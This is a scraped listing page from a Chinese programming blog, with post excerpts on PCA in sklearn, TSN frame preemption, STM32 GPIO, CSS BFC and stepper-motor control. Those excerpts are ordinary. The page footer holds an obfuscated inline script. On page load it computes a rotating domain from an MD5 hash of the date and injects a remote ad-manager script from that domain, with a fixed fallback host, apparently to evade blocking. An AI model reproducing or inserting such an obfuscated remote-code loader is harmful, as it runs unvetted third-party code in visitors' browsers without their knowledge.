三、数据归约任务1 导入文件“Euro2012_stats.csv”，查看后去除数据中不能直接参与PCA运算的属性列（队伍名称，百分数等列）。
注：对应csv文件可在博客资源中获取。
from sklearn.decomposition import PCA import pandas as pd eu=pd.read_csv("D:\\dataspace\\Euro2012_stats.csv",encoding="utf-8-sig") pd.set_option('display.max_rows',None) pd.set_option('display.max_columns', None) eu=pd.DataFrame(eu) #数据预览 print(eu.dtypes) #查看各特征列对应的属性 eu1=eu.drop(columns=['Team','Shooting Accuracy','% Goals-to-shots','Passing Accuracy','Saves-to-shots ratio']) #删除非数值型属性的特征列 print(eu1) #删除后的数据预览 数据预览：
查询各特征对应的属性：
删除后的数据预览：
四、数据规约任务2 对数据进行PCA分析。引入pca（from sklearn.decomposition import PCA），将所有数值型属性列降维降到5维，并查看降维结果与信息。通过分析结果，选择并说明合适的压缩维度。（自学explained_variance_ratio_，在实验报告中说明数值代表什么含义，并展示结果）
from sklearn.decomposition import PCA pca=PCA(n_components=5) pca.fit(eu1) newdata=pca.transform(eu1) print('降维结果\n',newdata) newdata1=pd.DataFrame(newdata) print('方差值所占比\n',pca.explained_variance_ratio_) 降维结果如下图：
通过计算explained_variance_ratio_可以得到各主成分的方差值占总方差值的比例，也就是方差贡献率。
将降维后的数据特征列的首列作为y轴，原数据中的team列作为x轴，绘制折线图：
重新调参，确定合适的压缩维度：
scorelist =[] for i in range(16): pca1=PCA(n_components=i) pca2=pca1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/075d8c209742ea129d130f69cbb31060/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1d6fe9bd5e0b86a36ddc061e5f58819/" rel="bookmark">
			时间敏感网络TSN—帧抢占技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		时间敏感网络—帧抢占技术 前言时间敏感网络概述时间敏感网络帧抢占技术TSN时间片与保护带技术帧抢占原理帧格式比较帧抢占过程 总结 前言 最近公司准备研发TSN技术相关产品（基于FPGA及嵌入式架构，做终端或者交换机），因此接下来我将不定期更新TSN技术相关内容，包括TSN协议理论及工程开发应用，今天简单整理一下TSN中IEEE 802.1 Qbu协议标准及IEEE 802.3br协议标准定义的帧抢占技术。
时间敏感网络概述 时间敏感网络（Time Sensitive Networking，TSN）通过业务调度与资源分配的方式，可为物联网业务提供低时延、低抖动、高可靠的通信服务，其作为支撑智能工业、自动驾驶等新兴应用的关键技术，近年来成为工业界与学术界的研究热点。TSN技术由一系列标准组成，该系列标准定义了TSN中时间同步、高可靠性保证、有界低时延、专用资源和API管理等核心技术。其中，有界低时延技术保证了在复杂的异构网络中，关键控制帧的传输时延极低且有界，确保了系统的稳定。有界低时延技术主要应用于交换网络中MAC网桥设备，通过信用流量整形、帧抢占、流量调度、循环队列转发、异步整形等具体技术实现。而本文将对其中的帧抢占技术进行介绍。 时间敏感网络帧抢占技术 IEEE802.1Qbu标准和IEEE802.3br标准定义了帧抢占技术，该技术旨在降低数据流延迟的同时，最大限度地提升数据链路的有效带宽。
帧抢占技术属于OSI七层参考协议中数据链路层的MAC子层，如下图所示。
其核心思想可概括为高层与MAC子层有两条独立的数据通道，分别传输时间敏感帧和优先级较低的可被抢占帧。时间敏感帧通过MAC子层的eMAC被组帧成mPacket帧格式的数据帧，而可抢占帧通过pMAC进行mPacket帧的组帧。所有mPacket帧均通过数据链路层与物理层之间仅有的一个媒体独立接口与物理层进行数据的交互。
TSN时间片与保护带技术 基于IEEE802.1AS标准建立全局精确时钟同步。基于IEEE802.1Qbv 标准将全局时间轴划分成多个时间周期，并在每个时钟周期内划分成多个连续的时间片，在每个相同编号的时间片内，仅能传输相同类型的数据帧。通过这种方式对各个流量等级的数据流进行调度传输，以避免传输冲突。
保护带技术简单的可理解为：低优先级数据流较大，在时间片2内未传输完毕而占用了时间片1的资源，导致高优先级数据流传输延迟增加，如下图所示：
因此为应对这种干扰，引入了保护带机制。如下图所示，在保护带内，未传输完毕的数据帧可以继续传输，未开始传输的数据帧必须停止传输，以防止
低优先级数据帧侵入时间片1。但是当网络中的数据帧较长时，保护带十分冗长，仍然会存在有效带宽较低的情况。
帧抢占原理 帧格式比较 传统以太网帧格式
IEEE Std 802.1Q帧格式
IEEE Std 802.3br帧格式
IEEE Std 802.3br帧和传统以太网帧的帧格式主要区别是在数据帧第8个字节。传统以太网帧的第8 个字节用来作为帧起始定界符，IEEE Std 802.3br帧的第8个字节用来判断数据帧类别。
另外，该协议中还定义了快速帧（eMAC帧）和可抢占帧（pMAC帧），通过第8个字节的帧类别来区分快速帧（eMAC帧）和可抢占帧（pMAC帧）。如其帧格式如下：
eMAC帧格式
pMAC帧格式
当pMAC帧被eMAC帧抢占时，被抢占的pMAC帧分成pMAC切片帧首帧、pMAC切片帧中间帧和pMAC切片帧尾帧这几部分，三种数据帧格式如下所示：
pMAC切片帧首帧
pMAC切片帧中间帧
pMAC切片帧尾帧
pMAC切片帧中间帧和尾帧有着相似的帧格式，但使用的循环冗余校验码不同。其中，切片帧首帧和切片帧中间帧使用的是mCRC校验码。当发生帧抢占时，为了保证切片帧首帧和切片帧中间帧的准确
性，TSN交换机需要给切片帧添加一个校验字段。为了区别于原数据帧的FCS校验码，新添字段称作mCRC。mCRC计算过程如下：
根据该切片帧数据计算出CRC值，这一步骤与普通以太网帧CRC计算方式相同。将32位CRC与0x0000FFFF进行异或运算，得到mCRC值。切片帧尾帧使用的是FCS校验码，它的FCS校验码与原可抢占帧的FCS 校验码相同。 帧抢占过程 1.帧抢占验证
开启帧抢占前交换设备会通过LLDP协议向相邻设备发送验证帧，如果在规定时间内收到相邻设备发来的响应帧，则帧抢占验证成功，可以启用帧抢占功能。如果在规定时间内没有收到相邻设备发来的响应帧，则交换设备会再次向相邻设备发送验证帧，若还是没收到相邻设备发来的响应帧，则帧抢占验证失败，无法启用帧抢占功能。当帧抢占功能验证通过后，数据帧的附加信息将添加到mPacket 头部，描述其抢占特性。
2.帧抢占切片过程
（1）时间敏感网络帧映射成pMAC帧和eMAC 帧。pMAC帧进入pMAC层传输，eMAC帧进入eMAC层，判断抢占条件是否成立（交换机会检查该pMAC 的长度是否大于124 字节，且还未传输的数据是否大于60 个字节）
（2）交换机给pMAC帧已传输的部分补上4字节的mCRC校验码，并暂停pMAC层中pMAC帧的传输，然后切换到eMAC层传输eMAC帧。当该eMAC帧传输完成后，若还有eMAC帧需要传输，则继续传输eMAC帧，若没有eMAC帧需要传输，则暂停eMAC层中的数据传输，切换到pMAC 层传输被抢占pMAC帧的剩余部分。切片过程形成的数据帧如下图所示：
此外，IEEE Std 802.3br标准定义不同的SMD值来区分不同类别的数据帧，具体可参照下表：
只有SMD-Cx值顺序正确且第一个切片帧中间帧使用SMD编码值0x61时切片帧才能合成原pMAC帧。如果切片合成时不满足此条件，该切片帧将会被丢弃。
3.帧抢占切片帧合成过程
在接收端节点，独立接口(xMII)在帧到达时检查每个帧的SMD值。若是eMAC帧（即包含SMD-E 的帧），则由eMAC帧接收器直接接收。否则，pMAC帧和切片帧由特定帧处理器处理。特定帧处理器负责保证每一个可抢占帧的所有切片帧都被完整且按正确的顺序合成并接收，它通过同时使用“mCRC”和“frag count”值来保证可抢占帧的接 收。特定帧处理器接收到切片帧后会生成一个mCRC校验码，通过这个mCRC校验值与原始帧切片时生成的mCRC值比较：值相同，说明该切片帧传输正确；值不同，说明该切片帧传输错误。同时，通过“frag count”值检测切片帧传输的顺序是否正确。只有“mCRC”和“frag count”值都无误的切片帧才能合成原数据帧并接收。 总结 TSN将帧抢占机制引入MAC子层，在数据传输冲突时，通过对低优先级数据帧的拆解、分时传输和重新组帧，保证了高优先级数据流的低时延，同时降低了保护带的影响，避免了带宽利用率的大幅下降。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6341d355778958e448cefef807e585db/" rel="bookmark">
			STM32F407学习笔记（2）基于hal库，GPIO的主要内容。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言：
一、GPIO的原理
介绍：
功能：
二、基本外设介绍即代码
LED
按键
矩阵键盘
前言： 因学业繁忙，停更了许久，暑假来袭，也有些空余时间，想在这更新下。这里我想了下，下面只介绍四节内容。其实这一块已经学完好久了，只是没有时间去更新。
1、GPIO
2、串口
3、定时器
4、ADC DAC
我认为这四个内容比较重要。
电赛实验室培训用到的第一个外设就是GPIO，当然这也是最简单的一个外设了，学习的话，当然要从容易的开始学习啦。在学习之前，我们还是先看一看这块板子吧，这介绍了很多外设。这里我拿的是正点原子的板子举例的，自己本身用的不是这块板子。（都是STM32F407）
这期呢，我会介绍如何利用按键点亮一个led灯，这里用到的就是引脚的I/O口，点灯大师就是我。
一、GPIO的原理 介绍： GPIO是通用输入输出端口的简称，简单来说就是stm32可控制的引脚。
每个通用 I/O 端口包括 4 个 32 位配置寄存器（GPIOx_MODER、GPIOx_OTYPER、 GPIOx_OSPEEDR 和 GPIOx_PUPDR）、2 个 32 位数据寄存器（GPIOx_IDR 和 GPIOx_ODR）、1 个 32 位置位/复位寄存器 (GPIOx_BSRR)、1 个 32 位锁定寄存器 (GPIOx_LCKR) 和 2 个 32 位复用功能选择寄存器（GPIOx_AFRH 和 GPIOx_AFRL）
功能： STM32 提供了大量的 GPIO 引脚，可用于与其他外部设备进行数字信号通信。这些引脚可配置为输入或输出，并具有中断功能。
二、基本外设介绍即代码 我觉得单片机最基本的外设就是按键和LED灯，所以这里就介绍一下这块的代码。
LED 首先介绍LED，我们学习一块单片机首先要看原理，熟悉它的引脚与外设的基本对应关系，在使用cubemx的时候也就十分方便。
我们看到LED0和LED1，引脚对应是PF9和PF10，发光二极管具有单向导通性，左边为高电平，所以只用当PF9和PF10为低电平时，发光二极管才能被点亮，反之，则会熄灭。这里也讲一下简单的cubemx的配置
将我们芯片的PF9和PF10设置为输出模式即GPIO_Output，这里的LED相当于外设，输出外设。
把我们的GPIO输出电平改为高电平，初始状态灯灭，选择我的的推挽输出。
开漏模式：输出 0 时，N-MOS 导通，P-MOS 不被激活，输出0。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6341d355778958e448cefef807e585db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/543d66360fc2c3dcf85c86af696e3e83/" rel="bookmark">
			前端三件套之css(5) BFC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是BFC
能触发BFC的标签或属性
BFC布局的标准规则
什么是BFC BFC全称(Block formatting context) 意为："块级格式化上下文"。 它就像我们学校分班级一样，虽然都是一个学校，但是每个班是独立的，不相干扰的。
&lt;div class="main"&gt; &lt;div class="left"&gt;这是div1&lt;/div&gt; &lt;div class="right"&gt;这是div2&lt;/div&gt; &lt;/div&gt; 例如上述的三个div，"main" 有两个子标签 "left" 和 "right" ，BFC的作用就是分别让这两个子标签形成独立的容器，left 的属性不会应用到 right 中。
能触发BFC的标签或属性 1：根元素&lt;html&gt; (相当于最外层的网页界面的子元素自动遵守BFC规则排列）
2：浮动（float : left 及 float : right）
3：绝对定位和固定定位（position: absolute及position: fixed）
4：设置行内块元素和弹性布局（display：inline-block，flex）
5：内容隐藏（overflow：hidden）
仔细观察，它们都有一个共同的特性：脱离文档流。换句话说，能脱离文档流就会触发BFC。
BFC布局的标准规则 虽然BFC会让容器独立，但是布局的规则还是不变的
1：触发BFC规则的标签，他内部的子标签只能在垂直方向一个一个排列，而不能横着排。
2：内部子标签垂直方向的距离由外边距由margin决定，并且两个相邻子标签外边距会重叠，谁的外边距大，就显示多少
3：计算距离时，会优先考虑top,bottom等定位，再考虑外边距
4：触发BCF的容器不会与其他触发BFC的容器重叠，只会相应的排在后面
5：由于继承关系，子容器的上外边距会传递给父元素，这时让父元素触发BFC形成独立容器，那么子元素将不会将上边距传给父元素
6：触发BFC的元素中，若子容器脱离文档流，那么计算高度时，也会计算子容器高度(该规则的体现见css(3) 浮动之解决父容器高度塌陷方法二)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1375a1d4ea9005d8e10b230bae22971/" rel="bookmark">
			stm32-步进电机代码及原理详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、原理 通电导线会产生磁场，只要控制四个电磁铁接断电，就可以控制中央磁铁旋转。
操作模式：控制中间磁铁一步转90°，称为全步模式。同理：45°半步。22.5°微步。
现实的步进电机是比较复杂的，因为转子的周围还有很多小齿，比如1.8步进值的电机的话转子齿为50，所以公式是360/50/8=0.9为半拍步进值。360/50/4=1.8才是步进值。根据对应手册计算。
二、代码 //正转代码，反转同理 IN1_HIGH; delay_ms(speed); IN1_LOW; IN2_HIGH; delay_ms(speed); IN2_LOW; IN3_HIGH; delay_ms(speed); IN3_LOW; IN4_HIGH; delay_ms(speed); IN4_LOW; 控制步进电机转多少最主要你得通过步进电机步距角度计算出电机转一圈需要多少脉冲，比如步距角度为0.9°则电机转一圈需要给步进电机驱动器360/0.9=400个脉冲，转半圈就是200个脉冲
我的算下来一圈4096个脉冲，我封装的一个函数八个脉冲，所以运行函数512次。所以代码为（需要自己查对应手册）
for( i = 0;i &lt; 512;i++) //电机正转 stepper(Pos,5); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f02cc3ec549c7c43b1c9869dd9404350/" rel="bookmark">
			【计算机毕业设计】215美食烹饪互动平台
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、系统截图（需要演示视频可以私聊） 摘 要 如今社会上各行各业，都喜欢用自己行业的专属软件工作，互联网发展到这个时候，人们已经发现离不开了互联网。新技术的产生，往往能解决一些老技术的弊端问题。因为传统美食信息管理难度大，容错率低，管理人员处理数据费工费时，所以专门为解决这个难题开发了一个美食烹饪互动平台，可以解决许多问题。
美食烹饪互动平台可以实现美食知识类型管理，美食管理，美食留言管理，美食收藏管理，美食知识管理，用户管理等功能。该系统采用了Mysql数据库，Java语言，Spring Boot框架等技术进行编程实现。
美食烹饪互动平台可以提高美食信息管理问题的解决效率，优化美食信息处理流程，保证美食信息数据的安全，它是一个非常可靠，非常安全的应用程序。
关键词：美食烹饪互动平台；Mysql数据库；Java语言
目 录
摘 要 Abstract 第1章 绪论 1.1 课题背景 1.2 课题意义 1.3 研究内容 第2章 开发环境与技术 2.1 Java语言 2.2 MYSQL数据库 2.3 IDEA开发工具 2.4 Spring Boot框架 第3章 系统分析 3.1 可行性分析 3.1.1 技术可行性 3.1.2 经济可行性 3.1.3 操作可行性 3.2 系统流程 3.2.1 操作流程 3.2.2 登录流程 3.2.3 删除信息流程 3.2.4 添加信息流程 3.3 性能需求 3.4 功能需求 第4章 系统设计 4.1 系统设计思想 4.2 功能结构设计 4.3 数据库设计 4.3.1 数据库概念设计 4.3.2 数据库物理设计 第5章 系统实现 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f02cc3ec549c7c43b1c9869dd9404350/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/117/">«</a>
	<span class="pagination__item pagination__item--current">118/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/119/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>